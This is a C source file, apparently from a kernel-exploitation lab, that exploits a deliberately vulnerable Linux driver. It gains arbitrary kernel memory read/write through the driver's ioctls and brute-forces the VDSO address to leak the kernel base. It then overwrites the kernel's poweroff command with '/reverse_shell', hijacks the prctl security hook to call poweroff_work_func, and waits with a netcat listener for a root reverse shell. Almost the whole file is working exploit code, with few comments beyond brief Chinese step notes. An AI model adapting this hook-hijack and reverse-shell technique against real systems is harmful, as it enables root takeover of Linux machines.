#define _GNU_SOURCE
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <stdio.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#include <sys/socket.h>
#include <sys/syscall.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <sys/prctl.h>   //prctl
#include <sys/auxv.h>    //AT_SYSINFO_EHDR

#ifndef _VULN_DRIVER_
	#define _VULN_DRIVER_
	#define DEVICE_NAME "vulnerable_device"
	#define IOCTL_NUM 0xFE
	#define DRIVER_TEST _IO (IOCTL_NUM,0)
	#define BUFFER_OVERFLOW _IOR (IOCTL_NUM,1,char *)
	#define NULL_POINTER_DEREF _IOR (IOCTL_NUM,2,unsigned long)
	#define ALLOC_UAF_OBJ _IO (IOCTL_NUM,3)
	#define USE_UAF_OBJ _IO (IOCTL_NUM,4)
	#define ALLOC_K_OBJ _IOR (IOCTL_NUM,5,unsigned long)
	#define FREE_UAF_OBJ _IO (IOCTL_NUM,6)
	#define ARBITRARY_RW_INIT _IOR(IOCTL_NUM,7, unsigned long)
	#define ARBITRARY_RW_REALLOC _IOR(IOCTL_NUM,8,unsigned long)
	#define ARBITRARY_RW_READ _IOWR(IOCTL_NUM,9,unsigned long)
	#define ARBITRARY_RW_SEEK _IOR(IOCTL_NUM,10,unsigned long)
	#define ARBITRARY_RW_WRITE _IOR(IOCTL_NUM,11,unsigned long)
	#define UNINITIALISED_STACK_ALLOC _IOR(IOCTL_NUM,12,unsigned long)
	#define UNINITIALISED_STACK_USE _IOR(IOCTL_NUM,13,unsigned long)
#endif

#define PATH "/dev/vulnerable_device"
#define START_ADDR 0xffffffff80000000
#define END_ADDR 0xffffffffffffefff

struct init_args {
	size_t size;
};
struct realloc_args{
	int grow;
	size_t size;
};
struct read_args{
	char *buff;
	size_t count;
};
struct seek_args{
	loff_t new_pos;
};
struct write_args{
	char *buff;
	size_t count;
};

int read_mem(int fd, size_t addr,char *buff,int count)
{
	struct seek_args s_args2;
	struct read_args r_args;
	int ret;

	s_args2.new_pos=addr-0x10;
	ret=ioctl(fd,ARBITRARY_RW_SEEK,&s_args2);  // seek
	r_args.buff=buff;
	r_args.count=count;
	ret=ioctl(fd,ARBITRARY_RW_READ,&r_args);   // read
	return ret;
}
int write_mem(int fd, size_t addr,char *buff,int count)
{
	struct seek_args s_args1;
	struct write_args w_args;
	int ret;

	s_args1.new_pos=addr-0x10;
	ret=ioctl(fd,ARBITRARY_RW_SEEK,&s_args1);  // seek
	w_args.buff=buff;
	w_args.count=count;
	ret=ioctl(fd,ARBITRARY_RW_WRITE,&w_args);  // write
	return ret;
}


int main()
{
	int fd=-1;
	size_t result=0;
	size_t addr=0;
	struct init_args i_args;
	struct realloc_args rello_args;

	size_t kernel_base=0;
    size_t selinux_disable_addr = 0x3607f0;   //ffffffff813607f0 T selinux_disable   - 0xffffffff81000000(vmmap) =0x3607f0
    size_t prctl_hook=0xe9bcd8;             // 0xffffffff81e9bcc0+0x18=0xffffffff81e9bcd8 - 0xffffffff81000000=0xe9bcd8
    size_t order_cmd=0xe4cf40;       //mov    rdi,0xffffffff81e4cf40
    size_t poweroff_work_addr=0xa7590; // ffffffff810a7590 t poweroff_work_func
	
	setvbuf(stdout, 0LL, 2, 0LL);
	char *buf=malloc(0x1000);
	fd=open(PATH,O_RDWR);
	if (fd<0){
		puts("[-] open error ! \n");
		exit(-1);
	}
    // 构造任意地址读写
	i_args.size=0x100;
	ioctl(fd, ARBITRARY_RW_INIT, &i_args);
	rello_args.grow=0;
	rello_args.size=0x100+1;
	ioctl(fd,ARBITRARY_RW_REALLOC,&rello_args);
	puts("[+] We can read and write any memory! [+]");
	//爆破VDSO地址，泄露kernel_base
	for (size_t addr=START_ADDR; addr<END_ADDR; addr+=0x1000)
	{
		read_mem(fd,addr,buf,0x1000);
		if (!strcmp("gettimeofday",buf+0x2cd))
		{
			result=addr;
			printf("[+] found vdso 0x%lx\n",result);
			break;
		}
	}
	if (result==0)
	{
		puts("[-] not found, try again! \n");
		exit(-1);
	}
    // 根据VDSO地址得到 kernel_base 
    kernel_base=result & 0xffffffffff000000;
    selinux_disable_addr+=kernel_base;
    prctl_hook+=kernel_base;
    order_cmd+=kernel_base;
    poweroff_work_addr+=kernel_base;
    printf("[+] found kernel_base: %p\n",kernel_base);
    printf("[+] found prctl_hook: %p\n",prctl_hook);
    printf("[+] found order_cmd: %p\n",order_cmd);
    printf("[+] found selinux_disable_addr: %p\n",selinux_disable_addr);
    printf("[+] found poweroff_work_addr: %p\n",poweroff_work_addr);

    // 修改 run_cmd变量
    memset(buf,'\x00',0x1000);
    strcpy(buf,"/reverse_shell\0");
    write_mem(fd,order_cmd, buf,strlen(buf)+1);

    // 劫持prctl_hook去执行poweroff_work
    memset(buf,'\x00',0x1000);
    *(size_t *)buf = poweroff_work_addr;
    write_mem(fd,prctl_hook, buf, 8);

    //需要fork()子线程来执行reverse_shell程序
    if (fork()==0){
    	prctl(addr,2,addr,addr,2);
    	exit(-1);
    }
    system("nc -l -p 2333");
	return 0;
}
/*



*/
